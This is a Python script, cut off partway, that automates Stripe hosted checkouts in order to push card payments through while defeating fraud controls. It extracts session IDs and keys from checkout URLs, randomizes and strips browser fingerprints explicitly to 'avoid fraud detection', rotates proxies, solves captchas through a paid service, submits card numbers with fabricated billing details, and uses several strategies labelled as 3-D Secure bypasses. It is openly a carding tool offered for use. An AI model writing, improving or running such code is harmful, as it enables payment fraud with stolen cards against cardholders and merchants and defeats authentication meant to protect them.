import requests
import base64
import random
import re
import json
import time
import os
from urllib.parse import unquote, urlencode, parse_qs
from datetime import datetime

requests.packages.urllib3.disable_warnings()

STRIPE_API = "https://api.stripe.com"
NOPECHA_API = "https://api.nopecha.com"
XOR_KEY = 5

NOPECHA_API_KEY = os.environ.get('NOPECHA_API_KEY', '')

THREEDS_CONFIG = {
    'max_retries': 3,
    'retry_delay': 0.5,
    'timeout': 15
}

def generate_stripe_guid():
    """Generate realistic Stripe device fingerprint ID (guid/muid/sid format)"""
    import uuid
    return str(uuid.uuid4())

def generate_stripe_muid():
    """Generate muid - merchant unique ID"""
    chars = '0123456789abcdef'
    return ''.join(random.choice(chars) for _ in range(32))

class StripeSession:
    """Maintains Stripe session with cookies for proper 3DS bypass"""
    
    def __init__(self, proxy=None):
        self.session = requests.Session()
        self.session.verify = False
        self.cookies = {}
        self.mids = {}
        self.cid = None
        self.user_agent = random.choice(USER_AGENTS)
        # Generate fresh device fingerprints for this session
        self.guid = generate_stripe_guid()
        self.muid = generate_stripe_muid()
        self.sid = generate_stripe_guid()
        
        if proxy:
            parts = proxy.split(':')
            if len(parts) == 4:
                self.session.proxies = {
                    'http': f'http://{parts[2]}:{parts[3]}@{parts[0]}:{parts[1]}',
                    'https': f'http://{parts[2]}:{parts[3]}@{parts[0]}:{parts[1]}'
                }
            elif len(parts) == 2:
                self.session.proxies = {'http': f'http://{proxy}', 'https': f'http://{proxy}'}
        
        self.session.headers.update({
            'User-Agent': self.user_agent,
            'Accept': 'application/json, text/plain, */*',
            'Accept-Language': '',  # Empty - no locale for 3DS bypass
            'Accept-Encoding': 'gzip, deflate, br'
        })
    
    def load_checkout_page(self, checkout_url):
        """Load checkout page to capture Stripe session cookies"""
        try:
            resp = self.session.get(checkout_url, timeout=15)
            self.cookies = dict(self.session.cookies)
            
            for name, value in self.cookies.items():
                if name.startswith('__stripe_mid'):
                    self.mids[name] = value
                elif name == 'cid':
                    self.cid = value
            
            print(f"[*] Captured {len(self.mids)} session cookies")
            return True
        except Exception as e:
            print(f"[!] Failed to load checkout: {e}")
            return False
    
    def get_stripe_headers(self):
        """Get headers that match browser Stripe.js requests"""
        return {
            'Content-Type': 'application/x-www-form-urlencoded',
            'Accept': 'application/json',
            'Accept-Language': 'en-GB,en-US;q=0.9,en;q=0.8',
            'Origin': 'https://checkout.stripe.com',
            'Referer': 'https://checkout.stripe.com/',
            'User-Agent': self.user_agent,
            'sec-ch-ua': '"Chromium";v="137", "Not/A)Brand";v="24"',
            'sec-ch-ua-mobile': '?0',
            'sec-ch-ua-platform': '"Windows"',
            'sec-fetch-dest': 'empty',
            'sec-fetch-mode': 'cors',
            'sec-fetch-site': 'same-site'
        }
    
    def post(self, url, data):
        """Make POST request with session cookies"""
        headers = self.get_stripe_headers()
        try:
            resp = self.session.post(url, data=data, headers=headers, timeout=15)
            return resp.json()
        except Exception as e:
            return {'error': {'message': str(e)}}
    
    def post_3ds(self, url, data):
        """Make POST request for 3DS with HTTP Toolkit bypass technique"""
        # 3DS requests must come from js.stripe.com origin
        headers = {
            'Content-Type': 'application/x-www-form-urlencoded',
            'Accept': 'application/json, text/plain, */*',
            'Origin': 'https://js.stripe.com',
            'Referer': 'https://js.stripe.com/',
            'User-Agent': self.user_agent,
            'x-stripe-js': '90ba939846'
        }
        try:
            # Build x-www-form-urlencoded manually like cool_intercept.js
            parts = []
            for key, value in data.items():
                encoded_key = requests.utils.quote(str(key), safe='')
                encoded_value = requests.utils.quote(str(value), safe='')
                parts.append(f"{encoded_key}={encoded_value}")
            body = '&'.join(parts)
            
            # Strip any remaining fingerprints
            body = strip_fingerprint_from_string(body)
            
            resp = self.session.post(url, data=body, headers=headers, timeout=15)
            return resp.json()
        except Exception as e:
            return {'error': {'message': str(e)}}
    
    def get_bypass_browser_data(self):
        """Generate fresh device fingerprint for each request - avoids fraud detection"""
        user_agents = [
            "Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/131.0.0.0 Safari/537.36",
            "Mozilla/5.0 (Macintosh; Intel Mac OS X 10_15_7) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/131.0.0.0 Safari/537.36",
            "Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/143.0.0.0 Safari/537.36",
            "Mozilla/5.0 (X11; Linux x86_64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/131.0.0.0 Safari/537.36",
            "Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/130.0.0.0 Safari/537.36",
            "Mozilla/5.0 (Macintosh; Intel Mac OS X 10_15_7) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/130.0.0.0 Safari/537.36"
        ]
        screen_sizes = [
            ('1920', '1080'), ('2560', '1440'), ('1366', '768'), 
            ('1536', '864'), ('1440', '900'), ('1680', '1050'),
            ('1280', '720'), ('1920', '1200'), ('2560', '1080')
        ]
        timezones = ['-480', '-420', '-360', '-300', '-240', '0', '60', '120', '180', '300', '330', '480', '540']
        color_depths = ['24', '32', '30']
        
        screen = random.choice(screen_sizes)
        return {
            'fingerprintAttempted': True,
            'fingerprintData': None,
            'challengeWindowSize': None,
            'threeDSCompInd': 'Y',
            'browserJavaEnabled': False,
            'browserJavascriptEnabled': True,
            'browserLanguage': '',  # KEY BYPASS: Empty string removes locale detection
            'browserColorDepth': random.choice(color_depths),
            'browserScreenWidth': screen[0],
            'browserScreenHeight': screen[1],
            'browserTZ': random.choice(timezones),
            'browserUserAgent': random.choice(user_agents)
        }

USER_AGENTS = [
    "Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/131.0.0.0 Safari/537.36",
    "Mozilla/5.0 (Macintosh; Intel Mac OS X 10_15_7) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/131.0.0.0 Safari/537.36",
    "Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/143.0.0.0 Safari/537.36"
]

COLORS = {
    'GREEN': '\033[92m',
    'RED': '\033[91m',
    'YELLOW': '\033[93m',
    'BLUE': '\033[94m',
    'CYAN': '\033[96m',
    'WHITE': '\033[97m',
    'BOLD': '\033[1m',
    'END': '\033[0m'
}

def color(text, c):
    return f"{COLORS.get(c, '')}{text}{COLORS['END']}"

def parse_checkout_url(checkout_url):
    result = {'sessionId': None, 'publicKey': None, 'site': None}
    
    if not checkout_url:
        return result
    
    try:
        checkout_url = unquote(checkout_url)
    except:
        pass
    
    session_match = re.search(r'cs_(?:live|test)_[A-Za-z0-9]+', checkout_url)
    if session_match:
        result['sessionId'] = session_match.group(0)
    
    fragment_pos = checkout_url.find('#')
    if fragment_pos != -1:
        fragment = checkout_url[fragment_pos + 1:]
        try:
            decoded = base64.b64decode(unquote(fragment))
            xor_decoded = ''.join(chr(b ^ XOR_KEY) for b in decoded)
            
            pk_match = re.search(r'pk_(?:live|test)_[A-Za-z0-9]+', xor_decoded)
            if pk_match:
                result['publicKey'] = pk_match.group(0)
            
            site_match = re.search(r'https?://[^\s"\']+', xor_decoded)
            if site_match:
                result['site'] = site_match.group(0)
        except:
            pass
    
    return result


def make_request(url, data, proxy=None):
    headers = {
        'Content-Type': 'application/x-www-form-urlencoded',
        'Accept': 'application/json',
        'Origin': 'https://checkout.stripe.com',
        'Referer': 'https://checkout.stripe.com/',
        'User-Agent': 'Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/141.0.0.0 Safari/537.36'
    }
    
    proxies = None
    if proxy:
        parts = proxy.split(':')
        if len(parts) == 4:
            proxies = {
                'http': f'http://{parts[2]}:{parts[3]}@{parts[0]}:{parts[1]}',
                'https': f'http://{parts[2]}:{parts[3]}@{parts[0]}:{parts[1]}'
            }
        elif len(parts) == 2:
            proxies = {'http': f'http://{proxy}', 'https': f'http://{proxy}'}
    
    try:
        response = requests.post(url, data=data, headers=headers, proxies=proxies, timeout=30, verify=False)
        return response.json()
    except Exception as e:
        return {'error': {'message': str(e)}}


def remove_fingerprint_data(payload):
    """Remove ALL fingerprinting data from payload (from abuse bypass.js)"""
    if isinstance(payload, dict):
        remove_keys = [
            'browser_locale', 'browser_timezone', 'timezone', 'timezoneOffset',
            'screen_width', 'screen_height', 'color_depth', 'language',
            'browserLanguage', 'user_agent', 'window_width', 'window_height',
            'locale', 'screen_color_depth'
        ]
        cleaned = {}
        for k, v in payload.items():
            if k in remove_keys:
                continue
            cleaned[k] = v
        return cleaned
    return payload


def strip_fingerprint_from_string(body_str):
    """Strip locale fingerprint data from string payload - preserves device_data"""
    if not body_str or not isinstance(body_str, str):
        return body_str
    
    result = body_str
    
    # Only remove locale patterns that could identify the user's location
    # DO NOT modify device_data as we intentionally craft it with bypass values
    patterns = [
        (r'en-US', ''), (r'en_US', ''), (r'en-GB', ''), (r'en_GB', ''),
        (r'locale=[^&]*&', 'locale=&'),
        (r'browser_locale=[^&]*&', 'browser_locale=&'),
    ]
    
    for pattern, replacement in patterns:
        result = re.sub(pattern, replacement, result, flags=re.IGNORECASE)
    
    # DO NOT modify three_d_secure[device_data] - we intentionally craft it with bypass values
    # (browserLanguage='', randomized fingerprints, etc.)
    
    return result


USER_AGENTS = [
    "Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/131.0.0.0 Safari/537.36",
    "Mozilla/5.0 (Macintosh; Intel Mac OS X 10_15_7) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/131.0.0.0 Safari/537.36",
    "Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/143.0.0.0 Safari/537.36",
    "Mozilla/5.0 (X11; Linux x86_64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/131.0.0.0 Safari/537.36",
    "Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/130.0.0.0 Safari/537.36",
    "Mozilla/5.0 (Macintosh; Intel Mac OS X 10_15_7) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/130.0.0.0 Safari/537.36"
]

SCREEN_SIZES = [
    ('1920', '1080'), ('2560', '1440'), ('1366', '768'), 
    ('1536', '864'), ('1440', '900'), ('1680', '1050'),
    ('1280', '720'), ('1920', '1200'), ('2560', '1080')
]

TIMEZONES = ['-480', '-420', '-360', '-300', '-240', '0', '60', '120', '180', '300', '330', '480', '540']

def get_bypass_browser_data():
    """Generate fresh device fingerprint for each request - avoids fraud detection"""
    screen = random.choice(SCREEN_SIZES)
    return {
        'fingerprintAttempted': True,
        'fingerprintData': None,
        'challengeWindowSize': None,
        'threeDSCompInd': 'Y',
        'browserJavaEnabled': False,
        'browserJavascriptEnabled': True,
        'browserLanguage': '',  # KEY BYPASS: Empty string removes locale detection
        'browserColorDepth': random.choice(['24', '32', '30']),
        'browserScreenWidth': screen[0],
        'browserScreenHeight': screen[1],
        'browserTZ': random.choice(TIMEZONES),
        'browserUserAgent': random.choice(USER_AGENTS)
    }


def solve_captcha_nopecha(sitekey, site_url, captcha_type='hcaptcha'):
    """Solve captcha using NopTcha API"""
    if not NOPECHA_API_KEY:
        print(color("[!] NopTcha API key not set", 'YELLOW'))
        return None
    
    print(f"[*] Solving {captcha_type} via NopTcha...")
    
    try:
        # Create task
        create_data = {
            'key': NOPECHA_API_KEY,
            'type': captcha_type,
            'sitekey': sitekey,
            'url': site_url
        }
        
        resp = requests.post(f"{NOPECHA_API}/token", json=create_data, timeout=30)
        result = resp.json()
        
        if 'data' in result:
            token = result['data']
            print(color(f"[+] Captcha solved!", 'GREEN'))
            return token
        elif 'error' in result:
            print(color(f"[!] NopTcha error: {result.get('message', 'Unknown')}", 'RED'))
            return None
        
        # If task ID returned, poll for result
        task_id = result.get('id')
        if task_id:
            for _ in range(60):  # 60 second timeout
                time.sleep(1)
                check_resp = requests.get(f"{NOPECHA_API}/token/{task_id}?key={NOPECHA_API_KEY}", timeout=30)
                check_result = check_resp.json()
                
                if 'data' in check_result:
                    print(color(f"[+] Captcha solved!", 'GREEN'))
                    return check_result['data']
                elif check_result.get('error'):
                    print(color(f"[!] NopTcha error: {check_result.get('message')}", 'RED'))
                    return None
        
        return None
    except Exception as e:
        print(color(f"[!] NopTcha exception: {str(e)[:50]}", 'RED'))
        return None


def make_3ds_request(url, data=None, method='POST', proxy=None):
    headers = {
        'Content-Type': 'application/x-www-form-urlencoded',
        'Accept': 'application/json, text/plain, */*',
        'Origin': 'https://js.stripe.com',
        'Referer': 'https://js.stripe.com/',
        'User-Agent': 'Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/120.0.0.0 Safari/537.36'
    }
    
    proxies = None
    if proxy:
        parts = proxy.split(':')
        if len(parts) == 4:
            proxies = {
                'http': f'http://{parts[2]}:{parts[3]}@{parts[0]}:{parts[1]}',
                'https': f'http://{parts[2]}:{parts[3]}@{parts[0]}:{parts[1]}'
            }
    
    for attempt in range(THREEDS_CONFIG['max_retries']):
        try:
            if method == 'GET':
                resp = requests.get(url, headers=headers, proxies=proxies, 
                                   timeout=THREEDS_CONFIG['timeout'], verify=False)
            else:
                resp = requests.post(url, data=data, headers=headers, proxies=proxies,
                                    timeout=THREEDS_CONFIG['timeout'], verify=False)
            return resp
        except requests.exceptions.Timeout:
            print(f"[!] Request timeout (attempt {attempt+1}/{THREEDS_CONFIG['max_retries']})")
        except requests.exceptions.ConnectionError as e:
            print(f"[!] Connection error: {str(e)[:50]}")
        except Exception as e:
            print(f"[!] Request error: {str(e)[:50]}")
        
        if attempt < THREEDS_CONFIG['max_retries'] - 1:
            time.sleep(THREEDS_CONFIG['retry_delay'] * (attempt + 1))
    
    return None


def handle_3ds_challenge(payment_intent, public_key, proxy=None):
    """
    Handle 3DS challenge using bypass techniques from:
    - threeeddddd bypass.js: threeDSCompInd='Y', stripped fingerprint
    - abuse bypass.js: fingerprint removal, locale stripping
    - deep-bypasser: multi-strategy approach
    """
    if not payment_intent or not isinstance(payment_intent, dict):
        return {'success': False, 'error': 'Invalid payment intent'}
    
    pi_id = payment_intent.get('id', '')
    pi_secret = payment_intent.get('client_secret', '')
    next_action = payment_intent.get('next_action', {})
    
    if not next_action:
        return {'success': False, 'error': 'No next_action found'}
    
    action_type = next_action.get('type', '')
    
    print(f"[*] 3DS Type: {action_type}")
    
    if action_type == 'use_stripe_sdk':
        sdk_data = next_action.get('use_stripe_sdk', {})
        
        source = sdk_data.get('source')
        three_d_secure_2_source = sdk_data.get('three_d_secure_2_source')
        
        src_to_use = three_d_secure_2_source or source
        print(f"[*] Source: {src_to_use}")
        
        if src_to_use:
            # STRATEGY 1: 3DS2 Authenticate with bypass browser data
            auth_url = f"{STRIPE_API}/v1/3ds2/authenticate"
            
            # Use bypass browser data from threeeddddd
            browser_data = get_bypass_browser_data()
            
            auth_data = {
                'source': src_to_use,
                'browser': json.dumps(browser_data),
                'one_click_authn_device_support[hosted]': 'false',
                'one_click_authn_device_support[same_origin_frame]': 'false',
                'one_click_authn_device_support[spc_eligible]': 'false',
                'one_click_authn_device_support[webauthn_eligible]': 'false',
                'one_click_authn_device_support[publickey_credentials_get_allowed]': 'true',
                'key': public_key
            }
            
            # Strip fingerprinting from the encoded data
            auth_body = urlencode(auth_data)
            auth_body = strip_fingerprint_from_string(auth_body)
            
            resp = make_3ds_request(auth_url, auth_body, proxy=proxy)
            
            if resp:
                print(f"[*] 3DS Auth: {resp.status_code}")
                try:
                    result = resp.json()
                    state = result.get('state', '')
                    error = result.get('error', {})
                    
                    if error:
                        err_code = error.get('code', '')
                        err_msg = error.get('message', '')[:50]
                        print(f"[!] Error: {err_code} - {err_msg}")
                    else:
                        print(f"[*] State: {state}")
                        
                        if state == 'succeeded':
                            print(color("[+] 3DS BYPASSED!", 'GREEN'))
                            return {'success': True, 'status': '3DS_BYPASSED', 'state': state}
                        elif state == 'failed':
                            return {'success': False, 'status': '3DS_FAILED'}
                        elif state in ['challenge_required', 'pending']:
                            if 'acs_url' in result:
                                return complete_acs_challenge(result, src_to_use, public_key, proxy)
                            # Try polling in case it completes
                            return poll_payment_intent(pi_id, pi_secret, public_key, proxy)
                except Exception as e:
                    print(f"[!] Parse: {e}")
            
            # STRATEGY 2: Direct payment intent confirmation
            return try_direct_confirm(pi_id, pi_secret, public_key, proxy)
        
        return poll_payment_intent(pi_id, pi_secret, public_key, proxy)
    
    elif action_type == 'redirect_to_url':
        redirect_data = next_action.get('redirect_to_url', {})
        redirect_url = redirect_data.get('url', '')
        return_url = redirect_data.get('return_url', '')
        
        print(f"[*] 3DS Redirect detected")
        
        if redirect_url:
            return complete_redirect_3ds(redirect_url, return_url, pi_id, pi_secret, public_key, proxy)
        
        return {'success': False, 'status': '3DS_REDIRECT'}
    
    return {'success': False, 'status': '3DS_UNKNOWN', 'action_type': action_type}


def try_direct_confirm(pi_id, pi_secret, public_key, proxy=None):
    """Try direct payment intent confirmation with 3DS bypass"""
    print("[*] Trying direct confirmation...")
    
    confirm_url = f"{STRIPE_API}/v1/payment_intents/{pi_id}/confirm"
    
    data = {
        'key': public_key,
        'client_secret': pi_secret,
        'return_url': 'https://checkout.stripe.com/success',
        'mandate_data[customer_acceptance][type]': 'online',
        'mandate_data[customer_acceptance][online][user_agent]': random.choice(USER_AGENTS),
        'use_stripe_sdk': 'true'
    }
    
    body = urlencode(data)
    body = strip_fingerprint_from_string(body)
    
    resp = make_3ds_request(confirm_url, body, proxy=proxy)
    
    if resp:
        print(f"[*] Confirm: {resp.status_code}")
        try:
            result = resp.json()
            status = result.get('status', '')
            
            if status == 'succeeded':
                print(color("[+] Payment Confirmed!", 'GREEN'))
                return {'success': True, 'status': '3DS_BYPASSED'}
            elif status == 'requires_action':
                return {'success': False, 'status': '3DS_STILL_REQUIRED'}
        except:
            pass
    
    return poll_payment_intent(pi_id, pi_secret, public_key, proxy)


def poll_payment_intent(pi_id, pi_secret, public_key, proxy=None, max_polls=3):
    """Poll the payment intent to check if 3DS completed"""
    print("[*] Polling payment intent...")
    
    for i in range(max_polls):
        retrieve_url = f"{STRIPE_API}/v1/payment_intents/{pi_id}"
        data = {'key': public_key, 'client_secret': pi_secret}
        
        resp = make_3ds_request(retrieve_url, data, proxy=proxy)
        if resp and resp.status_code == 200:
            try:
                result = resp.json()
                status = result.get('status', '')
                print(f"[*] PI Status: {status}")
                
                if status == 'succeeded':
                    print(color("[+] Payment Succeeded!", 'GREEN'))
                    return {'success': True, 'status': '3DS_BYPASSED'}
                elif status == 'requires_payment_method':
                    return {'success': False, 'status': '3DS_FAILED'}
                elif status == 'requires_action':
                    if i < max_polls - 1:
                        time.sleep(1)
                        continue
                    return {'success': False, 'status': '3DS_STILL_REQUIRED'}
            except:
                pass
        
        if i < max_polls - 1:
            time.sleep(1)
    
    return {'success': False, 'status': '3DS_TIMEOUT'}


def complete_redirect_3ds(redirect_url, return_url, pi_id, pi_secret, public_key, proxy=None):
    """Try to complete 3DS via redirect flow"""
    print("[*] Attempting redirect 3DS...")
    
    # Fetch the redirect URL
    resp = make_3ds_request(redirect_url, method='GET', proxy=proxy)
    if resp and resp.status_code == 200:
        html = resp.text
        
        # Look for auto-submit forms or direct success
        if 'success' in html.lower() or 'complete' in html.lower():
            return poll_payment_intent(pi_id, pi_secret, public_key, proxy)
        
        # Look for form action URL
        form_match = re.search(r'<form[^>]*action=["\']([^"\']+)["\']', html, re.I)
        if form_match:
            action_url = form_match.group(1)
            print(f"[*] Found form action")
            
            # Extract hidden fields
            fields = {}
            for m in re.finditer(r'<input[^>]*name=["\']([^"\']+)["\'][^>]*value=["\']([^"\']*)["\']', html, re.I):
                fields[m.group(1)] = m.group(2)
            
            if fields:
                # Submit the form
                submit_resp = make_3ds_request(action_url, fields, proxy=proxy)
                if submit_resp:
                    return poll_payment_intent(pi_id, pi_secret, public_key, proxy)
    
    return {'success': False, 'status': '3DS_REDIRECT_FAILED'}


def complete_acs_challenge(auth_result, source, public_key, proxy=None):
    """Complete ACS challenge flow"""
    acs_url = auth_result.get('acs_url')
    creq = auth_result.get('creq')
    
    if not acs_url:
        return {'success': False, 'status': '3DS_NO_ACS'}
    
    print(f"[*] ACS Challenge...")
    
    # Send challenge request
    challenge_data = {'creq': creq} if creq else {}
    resp = make_3ds_request(acs_url, challenge_data, proxy=proxy)
    
    if resp:
        print(f"[*] ACS: {resp.status_code}")
        
        if resp.status_code in [200, 302]:
            # Look for CRes in response
            cres_match = re.search(r'["\']?cres["\']?\s*[=:]\s*["\']?([A-Za-z0-9+/=_-]+)', resp.text, re.I)
            if cres_match:
                cres = cres_match.group(1)
                print("[*] Got CRes")
                
                # Complete the challenge
                complete_url = f"{STRIPE_API}/v1/3ds2/challenge_complete"
                complete_data = {
                    'source': source,
                    'cres': cres,
                    'key': public_key
                }
                
                complete_resp = make_3ds_request(complete_url, complete_data, proxy=proxy)
                if complete_resp and complete_resp.status_code == 200:
                    try:
                        result = complete_resp.json()
                        if result.get('state') == 'succeeded':
                            print(color("[+] 3DS Completed!", 'GREEN'))
                            return {'success': True, 'status': '3DS_BYPASSED'}
                    except:
                        pass
            
            # Check if it's a frictionless success
            if 'success' in resp.text.lower() or resp.status_code == 200:
                return {'success': True, 'status': '3DS_FRICTIONLESS'}
    
    return {'success': False, 'status': '3DS_ACS_FAILED'}


def fetch_checkout_info(session_id, public_key, proxy=None, force_usd=True):
    """Fetch checkout info - empty fingerprinting fields for bypass"""
    url = f"{STRIPE_API}/v1/payment_pages/{session_id}/init"
    
    data = {
        'key': public_key,
        'eid': 'NA',
        'browser_locale': '',  # Required but empty for bypass
        'redirect_type': 'url'
    }
    
    return make_request(url, data, proxy)


def fetch_checkout_info_session(session_id, public_key, stripe_session):
    """Fetch checkout info - use fresh request like debug mode (not session)"""
    url = f"{STRIPE_API}/v1/payment_pages/{session_id}/init"
    
    data = {
        'key': public_key,
        'eid': 'NA',
        'browser_locale': '',
        'redirect_type': 'url'
    }
    
    # Use exact same request as debug mode (fresh request, no session headers)
    headers = {
        'Content-Type': 'application/x-www-form-urlencoded',
        'Accept': 'application/json',
        'Origin': 'https://checkout.stripe.com',
        'Referer': 'https://checkout.stripe.com/',
        'User-Agent': 'Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/141.0.0.0 Safari/537.36'
    }
    
    try:
        # Fresh request without session cookies/headers that might affect response
        resp = requests.post(url, data=data, headers=headers, timeout=30, verify=False)
        return resp.json()
    except Exception as e:
        return {'error': {'message': str(e)}}


def create_payment_method_session(card, public_key, session_id, email, config_id, stripe_session):
    """Create payment method using session with cookies"""
    url = f"{STRIPE_API}/v1/payment_methods"
    
    data = {
        'type': 'card',
        'card[number]': card['number'],
        'card[cvc]': card['cvc'],
        'card[exp_month]': card['exp_month'],
        'card[exp_year]': card['exp_year'],
        'billing_details[name]': 'Test User',
        'billing_details[email]': email,
        'billing_details[address][country]': 'US',
        'billing_details[address][line1]': '1501 Gaylord Trail',
        'billing_details[address][city]': 'Grapevine',
        'billing_details[address][state]': 'TX',
        'billing_details[address][postal_code]': '76051',
        'guid': stripe_session.guid,
        'muid': stripe_session.muid,
        'sid': stripe_session.sid,
        'key': public_key,
        'payment_user_agent': 'stripe.js/90ba939846; stripe-js-v3/90ba939846; checkout',
        'client_attribution_metadata[client_session_id]': session_id,
        'client_attribution_metadata[merchant_integration_source]': 'checkout',
        'client_attribution_metadata[merchant_integration_version]': 'hosted_checkout',
        'client_attribution_metadata[payment_method_selection_flow]': 'automatic'
    }
    
    if config_id:
        data['client_attribution_metadata[checkout_config_id]'] = config_id
    
    return stripe_session.post(url, data)


def confirm_payment_session(payment_method_id, session_id, public_key, expected_amount, init_checksum, config_id, stripe_session, checkout_url=None, checkout_mode='payment'):
    """Confirm payment using session with cookies and 3DS bypass - matches browser format"""
    url = f"{STRIPE_API}/v1/payment_pages/{session_id}/confirm"
    
    # Generate muid/sid with browser-like hash suffix
    muid_base = str(stripe_session.muid)[:36] if len(stripe_session.muid) > 36 else stripe_session.muid
    sid_base = str(stripe_session.sid)[:36] if len(stripe_session.sid) > 36 else stripe_session.sid
    hash_suffix = ''.join(random.choice('0123456789abcdef') for _ in range(6))
    
    data = {
        'eid': 'NA',
        'payment_method': payment_method_id,
        'expected_amount': str(expected_amount),
        'last_displayed_line_item_group_details[subtotal]': str(expected_amount),
        'last_displayed_line_item_group_details[total_exclusive_tax]': '0',
        'last_displayed_line_item_group_details[total_inclusive_tax]': '0',
        'last_displayed_line_item_group_details[total_discount_amount]': '0',
        'last_displayed_line_item_group_details[shipping_rate_amount]': '0',
        'expected_payment_method_type': 'card',
        'muid': f"{muid_base}{hash_suffix}",
        'sid': f"{sid_base}{hash_suffix}",
        'guid': 'NA',
        'key': public_key,
        'version': 'c264a67020',
        'init_checksum': init_checksum,
        'passive_captcha_token': '',
        'passive_captcha_ekey': '',
        'client_attribution_metadata[client_session_id]': stripe_session.guid,
        'client_attribution_metadata[checkout_session_id]': session_id,
        'client_attribution_metadata[merchant_integration_source]': 'checkout',
        'client_attribution_metadata[merchant_integration_version]': 'hosted_checkout',
        'client_attribution_metadata[payment_method_selection_flow]': 'merchant_specified'
    }
    
    if config_id:
        data['client_attribution_metadata[checkout_config_id]'] = config_id
    
    return stripe_session.post(url, data)


def handle_3ds_session(payment_intent, public_key, stripe_session):
    """Handle 3DS with session cookies for proper bypass"""
    if not payment_intent or not isinstance(payment_intent, dict):
        return {'success': False, 'error': 'Invalid payment intent'}
    
    pi_id = payment_intent.get('id', '')
    pi_secret = payment_intent.get('client_secret', '')
    next_action = payment_intent.get('next_action', {})
    
    if not next_action:
        return {'success': False, 'error': 'No next_action found'}
    
    action_type = next_action.get('type', '')
    print(f"[*] 3DS Type: {action_type}")
    
    if action_type == 'use_stripe_sdk':
        sdk_data = next_action.get('use_stripe_sdk', {})
        source = sdk_data.get('three_d_secure_2_source') or sdk_data.get('source')
        
        print(f"[*] Source: {source}")
        
        if source:
            # 3DS2 authenticate - use EXACT format from cool_intercept.js
            auth_url = f"{STRIPE_API}/v1/3ds2/authenticate"
            browser_data = stripe_session.get_bypass_browser_data()
            browser_json = json.dumps(browser_data, separators=(',', ':'))  # Compact JSON like JS
            
            auth_data = {
                'source': source,
                'browser': browser_json,
                'one_click_authn_device_support[hosted]': 'false',
                'one_click_authn_device_support[same_origin_frame]': 'false',
                'one_click_authn_device_support[spc_eligible]': 'false',
                'one_click_authn_device_support[webauthn_eligible]': 'false',
                'one_click_authn_device_support[publickey_credentials_get_allowed]': 'true',
                'key': public_key
            }
            
            result = stripe_session.post_3ds(auth_url, auth_data)
            
            if result:
                state = result.get('state', '')
                error = result.get('error', {})
                
                print(f"[*] 3DS State: {state}")
                
                if error:
                    print(f"[!] 3DS Error: {error.get('code', '')} - {error.get('message', '')[:50]}")
                elif state == 'succeeded':
                    print(color("[+] 3DS BYPASSED!", 'GREEN'))
                    return {'success': True, 'status': '3DS_BYPASSED'}
                elif state == 'failed':
                    return {'success': False, 'status': '3DS_FAILED'}
    
    return {'success': False, 'status': '3DS_REQUIRED'}


def update_checkout_currency(session_id, public_key, currency, init_checksum, proxy=None):
    url = f"{STRIPE_API}/v1/payment_pages/{session_id}/update"
    
    data = {
        'key': public_key,
        'eid': 'NA',
        'currency': currency,
        'locale': '',  # Empty - no locale for 3DS bypass
        'init_checksum': init_checksum
    }
    
    return make_request(url, data, proxy)


def get_amount_and_currency(info):
    """Extract amount and currency from checkout info - prioritize line_item_group for multi-currency"""
    currency = info.get('currency', 'usd')
    amount = None
    got_from_primary = False
    
    # Priority 1: line_item_group.due (contains correct multi-currency presentment amount)
    if 'line_item_group' in info and info['line_item_group']:
        lig = info['line_item_group']
        if isinstance(lig, dict):
            if 'due' in lig and lig['due'] is not None:
                amount = lig['due']
                got_from_primary = True
            if 'currency' in lig and lig['currency']:
                currency = lig['currency']
    
    # Priority 2: total_summary.due (fallback)
    if amount is None and 'total_summary' in info and info['total_summary']:
        ts = info['total_summary']
        if isinstance(ts, dict):
            if 'due' in ts and ts['due'] is not None:
                amount = ts['due']
                got_from_primary = True
            if 'currency' in ts and ts['currency']:
                currency = ts['currency']
    
    # Priority 3: computed_amount (only if above didn't have amount)
    if 'computed_amount' in info and info['computed_amount']:
        ca = info['computed_amount']
        if amount is None and 'total' in ca and ca['total'] is not None:
            amount = ca['total']
        # Only use computed_amount currency if we didn't get from primary sources
        if not got_from_primary and 'currency' in ca:
            currency = ca['currency']
    
    if 'presentment_currency' in info:
        currency = info['presentment_currency']
    if amount is None and 'presentment_amount' in info and info['presentment_amount'] is not None:
        amount = info['presentment_amount']
    
    if amount is None and 'amount_total' in info and info['amount_total'] is not None:
        amount = info['amount_total']
    
    if amount is None and 'total' in info and info['total'] is not None:
        amount = info['total']
    
    if amount is None and 'amount' in info and info['amount'] is not None:
        amount = info['amount']
    
    if amount is None and 'invoice' in info and info['invoice']:
        invoice = info['invoice']
        if 'total' in invoice and invoice['total'] is not None:
            amount = invoice['total']
        elif 'amount_due' in invoice and invoice['amount_due'] is not None:
            amount = invoice['amount_due']
        if 'currency' in invoice:
            currency = invoice['currency']
    
    if amount is None and 'line_items' in info:
        items = info.get('line_items', {})
        if isinstance(items, dict):
            items = items.get('data', [])
        total = 0
        for item in items:
            total += item.get('amount_total', 0) or item.get('amount', 0)
        if total > 0:
            amount = total
    
    if amount is None and 'payment_intent' in info:
        pi = info['payment_intent']
        if isinstance(pi, dict):
            if 'amount' in pi:
